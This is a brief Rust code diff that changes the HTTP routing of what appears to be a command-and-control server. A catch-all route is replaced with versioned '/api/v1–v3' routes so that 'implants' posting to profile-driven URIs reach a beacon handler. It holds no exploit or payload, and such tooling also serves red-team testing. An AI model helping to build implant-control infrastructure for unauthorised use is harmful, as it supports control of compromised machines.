@@ -54,11 +54,11 @@ pub fn build_router(state: HttpState) -> Router {
         .route("/api/beacon", post(beacon_handler))
         .route("/api/health", get(health_handler))
         .route("/api/ws", get(ws_handler::ws_upgrade_handler))
-        // Catch-all for profile-driven URIs: any POST to /api/* routes to
-        // the beacon handler. This allows implants using profile URIs
-        // (e.g., /api/v1/status) to reach the handler without explicit
-        // route registration.
-        .route("/api/{*rest}", post(beacon_handler));
+        // Common profile URI patterns — route to beacon_handler so implants
+        // using profile-driven URIs (e.g., /api/v1/status) reach the handler.
+        .route("/api/v1/{path}", post(beacon_handler))
+        .route("/api/v2/{path}", post(beacon_handler))
+        .route("/api/v3/{path}", post(beacon_handler));
 
     // If a profile is configured, add profile-driven routes
     if let Some(ref profile) = state.listener_profile {
